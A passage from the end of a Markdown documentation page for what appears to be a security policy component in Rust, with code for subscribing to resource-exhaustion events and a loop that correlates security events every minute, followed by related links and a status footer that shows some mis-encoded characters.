        self.event_bus.subscribe("system.resource.*", |event| {
            if event.topic.contains("exhausted") {
                self.handle_resource_exhaustion(event).await;
            }
        }).await?;
        
        Ok(())
    }
    
    async fn security_event_correlation_loop(self: std::sync::Arc<Self>) {
        let mut correlation_window = tokio::time::interval(Duration::from_secs(60));
        
        loop {
            correlation_window.tick().await;
            
            // Correlate events from the last minute
            let correlated_incidents = self.correlate_security_events().await;
            
            for incident in correlated_incidents {
                if incident.severity >= Severity::High {
                    self.handle_correlated_security_incident(incident).await;
                }
            }
        }
    }
}
```

## ðŸ”— Related Documentation

- [Policy Management Guide](../guides/policy-management.md) - Policy creation Ð¸ management
- [Multi-Agent Security](../agents/integration-guide.md#security) - Agent security integration
- [Tools Security](../tools/README.md#security) - Tool platform security
- [Incident Response](../guides/incident-response.md) - Security incident handling

---

**API Version**: 1.0  
**Implementation Status**: âœ… Production Ready  
**Security Audit**: âœ… Completed  
**Compliance**: OWASP Top 10, NIST Cybersecurity Framework  
**Last Security Review**: 2025-08-12